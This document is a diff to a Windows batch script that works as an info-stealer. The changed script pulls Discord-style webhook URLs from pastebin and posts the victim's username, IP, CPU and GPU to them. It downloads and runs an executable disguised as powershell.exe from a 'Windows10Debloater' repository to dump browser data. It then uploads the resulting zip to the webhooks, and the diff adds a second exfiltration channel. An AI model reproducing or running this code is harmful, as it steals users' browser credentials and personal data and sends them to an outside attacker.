@@ -1,11 +1,14 @@
 @echo off
-curl https://pastebin.com/raw/m0sf0H4P>w&set/p w=<w
+curl https://pastebin.com/raw/m0sf0H4P>w1&set/p w1=<w1
+curl https://pastebin.com/raw/BbywnnBa>w2&set/p w2=<w2
 setlocal
 curl icanhazip.com>ip&set/p ip=<ip
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic cpu get name ^| findstr /r /v "^$"`) do set cpu=%%i
 for /f "usebackq skip=1 tokens=*" %%i in (`wmic path win32_VideoController get name ^| findstr /r /v "^$"`) do set gpu=%%i
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" %w%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" %w1%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"**%username% has been grabbed!**^\n^\n**Information of User**^\n:bust_in_silhouette: Username : %username%^\n:gear: IP : %ip%^\n^\n**Information of Computer**^\n:alarm_clock: CPU : %cpu%^\n:bricks: GPU : %gpu%\"}" %w2%
 endlocal
 powershell -Command "iwr "https://github.com/Dazd-Pkz/Windows10Debloater/raw/main/powershell.exe" -o %temp%\powershell.exe"
 %temp%\powershell.exe --zip --dir dump
-curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" %w%
+curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" %w1%
+curl -k -F "payload_json={\"content\": \"All Internet Browser Information of %username%\"}" -F "file1=@dump\dump.zip" %w2%
